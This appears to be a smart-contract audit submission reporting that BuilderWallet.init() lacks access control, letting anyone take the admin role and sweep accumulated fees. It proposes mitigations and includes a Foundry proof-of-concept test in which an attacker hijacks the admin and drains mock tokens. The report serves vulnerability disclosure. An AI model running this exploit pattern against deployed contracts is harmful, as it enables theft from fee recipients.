  "user_handle": "jerry0422",
  "body": "## Finding description and impact\n\nThe BuilderWallet.init() function has no access control:\n```solidity\nfunction init(address _builderAdmin) external {\n    builderAdmin = _builderAdmin;\n}\n```\nWhile BuilderFactory.deployBuilder() correctly sets builderAdmin atomically after deployment, there is no restriction preventing subsequent calls to init(). Anyone can call this function at any time to overwrite the builderAdmin. BuilderWallet contracts receive protocol fees as they are used as fee recipients via _computeBuilderWallet() which is referenced in getFeeRecipient().\n\n### Attack scenario\n1. BuilderFactory owner deploys a BuilderWallet with legitimate builderAdmin\n2. Protocol fees accumulate in the wallet over time\n3. Attacker calls init(attackerAddress) to hijack admin role\n4. Attacker calls sweep(token, attackerAddress) to drain all tokens\n\nImpact: Direct theft of all accumulated builder fees with no preconditions required.\n\n## Recommended mitigation steps\n\nAdd a check to ensure init() can only be called once:\n```solidity\nfunction init(address _builderAdmin) external {\n    require(builderAdmin == address(0), \"Already initialized\");\n    builderAdmin = _builderAdmin;\n}\n```\nAlternatively, if admin rotation is a desired feature, restrict to the current admin:\n```solidity\nfunction init(address _builderAdmin) external {\n    require(msg.sender == builderAdmin || builderAdmin == address(0), \"Not authorized\");\n    builderAdmin = _builderAdmin;\n}\n```",
  "proof_of_concept": "Add the following test file to test/foundry/ and run with forge test --match-contract BuilderWalletExploitTest -vvv:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\n// Minimal interfaces and contracts needed for POC\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\n// Copy of BuilderWallet from RiskEngine.sol\ncontract BuilderWallet {\n    address public immutable FACTORY;\n    address public builderAdmin;\n\n    constructor(address factory) {\n        FACTORY = factory;\n    }\n\n    function init(address _builderAdmin) external {\n        builderAdmin = _builderAdmin;\n    }\n\n    function sweep(address token, address to) external {\n        require(msg.sender == builderAdmin, \"NotBuilder\");\n        uint256 bal = IERC20(token).balanceOf(address(this));\n        if (bal == 0) return;\n        IERC20(token).transfer(to, bal);\n    }\n}\n\n// Simple ERC20 mock for testing\ncontract MockERC20 {\n    mapping(address => uint256) public balanceOf;\n    \n    function mint(address to, uint256 amount) external {\n        balanceOf[to] += amount;\n    }\n    \n    function transfer(address to, uint256 amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n        return true;\n    }\n}\n\ncontract BuilderWalletExploitTest is Test {\n    BuilderWallet public wallet;\n    MockERC20 public token;\n    \n    address public factory = address(0xF00);\n    address public legitimateAdmin = address(0x1);\n    address public attacker = address(0xBAD);\n    \n    function setUp() public {\n        // Deploy BuilderWallet (simulating what BuilderFactory.deployBuilder does)\n        wallet = new BuilderWallet(factory);\n        \n        // Factory sets legitimate admin (atomic with deployment in real scenario)\n        wallet.init(legitimateAdmin);\n        \n        // Deploy mock token\n        token = new MockERC20();\n        \n        // Simulate fees accumulating in the wallet\n        token.mint(address(wallet), 1000 ether);\n    }\n    \n    function test_AttackerCanHijackAdminAndStealFunds() public {\n        // Verify initial state\n        assertEq(wallet.builderAdmin(), legitimateAdmin);\n        assertEq(token.balanceOf(address(wallet)), 1000 ether);\n        assertEq(token.balanceOf(attacker), 0);\n        \n        // === ATTACK ===\n        vm.startPrank(attacker);\n        \n        // Step 1: Attacker hijacks admin by calling init() - NO ACCESS CONTROL!\n        wallet.init(attacker);\n        \n        // Verify attacker is now admin\n        assertEq(wallet.builderAdmin(), attacker);\n        \n        // Step 2: Attacker drains all funds\n        wallet.sweep(address(token), attacker);\n        \n        vm.stopPrank();\n        \n        // Verify theft was successful\n        assertEq(token.balanceOf(address(wallet)), 0);\n        assertEq(token.balanceOf(attacker), 1000 ether);\n        \n        console.log(\"Attack successful!\");\n        console.log(\"Attacker stole:\", token.balanceOf(attacker) / 1e18, \"tokens\");\n    }\n    \n    function test_LegitimateAdminCannotPreventAttack() public {\n        // Even if legitimate admin tries to sweep first, attacker can front-run\n        \n        // Attacker front-runs and hijacks admin\n        vm.prank(attacker);\n        wallet.init(attacker);\n        \n        // Legitimate admin's sweep now fails\n        vm.prank(legitimateAdmin);\n        vm.expectRevert(\"NotBuilder\");\n        wallet.sweep(address(token), legitimateAdmin);\n        \n        // Attacker drains funds\n        vm.prank(attacker);\n        wallet.sweep(address(token), attacker);\n        \n        assertEq(token.balanceOf(attacker), 1000 ether);\n    }\n}\n```",
